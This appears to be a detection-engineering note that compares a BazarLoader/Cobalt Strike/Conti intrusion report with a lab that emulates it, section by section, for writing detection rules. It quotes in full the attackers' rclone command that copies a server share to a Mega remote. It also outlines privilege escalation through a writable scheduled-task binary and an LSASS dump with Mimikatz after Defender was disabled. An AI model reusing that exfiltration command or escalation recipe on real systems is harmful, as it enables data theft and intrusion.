# Gaps between the source campaign and this lab

Only the differences that change what an analyst can see are listed. Tool trivia and one-off artefacts
are left out.

## 1. Privilege: the report does not show how the loader reached SYSTEM

**Source.** The macro, the HTA and `regsvr32` run as the logged-on user. BazarLoader then invokes
`svchost.exe`, two DLLs are loaded by `rundll32` under that service host, and `D8B3.dll` injects into
`winlogon` at high integrity. The report records the result; it never records the step that produced
the privilege.

**Lab.** The victim account is a standard user, so the loader cannot create a service. The missing
privilege is supplied by a deliberate misconfiguration: `C:\ProgramData\C0015` is writable by `Users`
and a scheduled task already runs `C:\ProgramData\C0015\updater.exe` as SYSTEM every minute. The
loader overwrites that binary and the next task start gives a SYSTEM stager.

**Why it matters.** This is the largest gap. Every step after the loader depends on a lab artefact
rather than campaign behaviour, so the elevation telemetry describes the lab weakness, not the
intrusion. It is at least a testable behaviour: a user writes a PE into `ProgramData` and the task
scheduler executes that path as SYSTEM.

## 2. The loader and the command and control

**Source.** BazarLoader: Go compiled, masquerading as `compareForfor.jpg`, a few megabytes, invalid
certificate, empty metadata, callbacks to four hosted addresses on 443. Then Cobalt Strike:
`checkauj.com` with a Let's Encrypt certificate, `SleepTime 60000`, `Jitter 37`, cookies,
`bStageCleanup`, jquery URIs, `SpawnTo rundll32`.

**Lab.** A Sliver implant, 46 MB, on 443 with an approximated jquery profile and a self-signed
`CN=checkauj.com` certificate. It runs as a session, not as a beacon on a sixty second cycle.

**Why it matters.** Size, signature, certificate chain and cadence all differ. Rules that key on the
beacon interval, the jitter, the certificate issuer or the file size cannot be calibrated here; rules
on the URI pair, the process that makes the call and the destination can.

## 3. Credential access: tool and protection

**Source.** ProcessHacker dropped in `C:\` and used through its interface to read LSASS.

**Lab.** Mimikatz from a SYSTEM session. `RunAsPPL` is not set; Defender real-time and one ASR rule
have to be disabled for the dump to succeed, and the ASR rule blocked it first.

**Why it matters.** The LSASS access event is equivalent, but the process image, its command line and
the operator interaction differ. The lab also cannot show what a protected host does, because the dump
never succeeds there.

## 4. Interactive access

**Source.** RDP to the backup server through the beacon, review of the backup console, then
`taskmgr /4` from the shell.

**Lab.** RDP through a SOCKS proxy on the beacon with TLS and NTLM. The server had to stop requiring
NLA because the client cannot reach a KDC through the tunnel. `taskmgr /4` is started from the shell
with the keyboard. The backup console review is absent.

**Why it matters.** The type 10 logon and the `taskmgr` parent edge match, but a lab-specific registry
change is needed to get there, and one of the three operator actions of that day is missing.

## 5. Exfiltration: volume, timing and source host

**Source.** `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing
--auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`, twice, each about three hours,
between 1900 and 2200 UTC, run on the server that holds the share.

**Lab.** The same command line, from the victim user context on another host, minutes per round.

**Why it matters.** The command line matches; the volume, the duration and the parent process do not.
Volume and time based detections cannot be tuned from this data, and the transfer has to come from
another host because a SYSTEM process cannot read its own host's share over the loopback.

## 6. Impact: no encryption

**Source.** The Conti locker encrypts through `C$` mounts, deletes or unlocks what blocks it, writes
`readme.txt` in every directory and is followed by a directory listing to confirm.

**Lab.** A simulator with the same argument set, the same `-p \\HOST\C$` form and the same note
placement, which renames files to `.c0015` instead of encrypting them, against a corpus directory.

**Why it matters.** Process tree, arguments and note artefacts match. Encryption artefacts, the
unlocker, the ping sweep that builds the target list and the confirmation listing do not exist here.

## What still carries over

The delivery chain, the proxy execution pattern, the injection into a system process, the WMI pivot,
the per-user service host, the interactive logon, the share based transfer and the note placement are
reproduced closely enough that their telemetry can be used to write and test rules.
